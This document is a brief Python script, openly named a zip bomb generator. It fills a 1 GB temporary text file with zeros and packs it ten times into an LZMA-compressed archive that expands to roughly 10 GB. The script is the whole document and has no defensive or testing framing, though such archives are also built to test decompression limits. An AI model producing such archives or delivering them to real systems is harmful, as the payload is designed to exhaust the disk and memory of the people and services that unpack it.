import os
import tempfile
from zipfile import ZIP_LZMA, ZipFile


def create_txt_file(size_in_byte) -> str:
    handle, filepath = tempfile.mkstemp(suffix=".txt", prefix="zip-txt-")
    os.close(handle)
    with open(filepath, "w") as fp:
        fp.write("0" * size_in_byte)
    return filepath


def create_zipbomb(inner_file_size_in_bytes=10 ** 6, nb_inner_files=10):
    filepath = create_txt_file(size_in_byte=inner_file_size_in_bytes)
    with ZipFile("zipbomb.zip", "w", ZIP_LZMA) as myzip:
        for i in range(nb_inner_files):
            myzip.write(filepath, f"{i}.txt")
            print(i)
    os.remove(filepath)


if __name__ == "__main__":
    create_zipbomb(inner_file_size_in_bytes=10 ** 9, nb_inner_files=10)
